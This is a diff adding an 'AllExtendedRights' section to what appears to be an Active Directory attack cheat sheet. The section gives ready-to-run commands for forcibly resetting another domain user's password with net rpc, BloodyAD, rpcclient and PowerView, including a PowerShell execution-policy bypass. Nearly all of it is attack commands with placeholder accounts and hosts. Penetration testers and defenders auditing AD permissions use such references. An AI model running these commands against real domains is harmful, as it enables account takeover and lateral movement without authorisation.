@@ -57,3 +57,24 @@ Change the password of a user
     $NewPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
     Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword
 
+### AllExtendedRights
+
+#### 1) Linux Net RPC - Samba
+
+    net rpc password TARGET_USER 'Password@987' -U domain.local/USER1%'Password@1' -S DC_IP
+
+#### 2) BloodyAD
+
+    bloodyAD --host "DC_IP" -d "domain.local" -u "USER1" -p "Password@1" set password "TARGET_USER" "Password@987"
+
+#### 3) Rpcclient
+
+    rpcclient -U domain.local/USER1 DC_IP
+    rpcclient $> setuserinfo TARGET_USER 23 Ignite@987
+
+#### 4) Powerview
+
+    powershell -ep bypass
+    Import-Module .\PowerView.ps1
+    $NewPassword = ConvertTo-SecureString 'Password1234' -AsPlainText -Force
+    Set-DomainUserPassword -Identity 'TARGET_USER' -AccountPassword $NewPassword
